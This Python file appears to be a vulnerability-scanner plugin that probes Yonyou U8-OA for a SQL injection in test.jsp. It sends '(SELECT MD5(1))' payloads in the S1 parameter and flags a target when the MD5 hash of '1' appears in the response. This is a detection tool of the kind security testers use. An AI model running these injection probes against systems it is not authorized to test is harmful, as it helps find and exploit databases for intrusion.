#!/usr/bin/env python3
# -*- coding:utf-8 -*-

yonyou_u8_oa_test_sqlinject_payloads = [
    {'path': 'yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))'},
    {'path': 'test.jsp?doType=101&S1=(SELECT%20MD5(1))'},
]

def u8_oa_test_sqlinject_scan(self, clients):
    ''' 由于与致远OA使用相同的文件, 于是存在同样的漏洞 '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name + 'U8-OA',
        'vul_type': 'SQLinject',
        'vul_id': 'Yonyou-u8-test.jsp-sqlinject',
    }

    for payload in yonyou_u8_oa_test_sqlinject_payloads:
        path = payload['path']

        res = client.request(
            'get',
            path,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if ('c4ca4238a0b923820dcc509a6f75849b' in res.text):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
